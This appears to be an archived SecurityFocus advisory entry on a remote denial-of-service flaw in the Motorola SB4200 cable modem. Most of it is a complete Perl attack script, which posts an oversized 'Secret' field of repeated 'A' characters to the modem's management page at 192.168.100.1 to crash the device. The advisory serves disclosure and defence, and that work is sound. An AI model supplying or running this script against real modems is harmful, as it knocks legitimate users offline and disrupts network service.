source: http://www.securityfocus.com/bid/20309/info

Motorola SB4200 is prone to a remote denial-of-service vulnerability.

This may permit an attacker to crash affected devices, denying further network services to legitimate users.

#!/usr/bin/perl -w
###################################################
# Remote Motorola SB4200 DoS attack.              #
# By Dave Gil.                                    # 
# Infosec Labs                                    #
###################################################

use strict; 
use HTTP::Request::Common qw (POST GET); 
use LWP::UserAgent; 
my $ua = LWP::UserAgent->new(); 
my $url = "http://192.168.100.1/"; 
my $req = $ua->post( $url, [MfcISAPICommand => 'SecretProc', Secret => 'A' x int rand(4000)]);

print "The DoS has been sent.";
exit();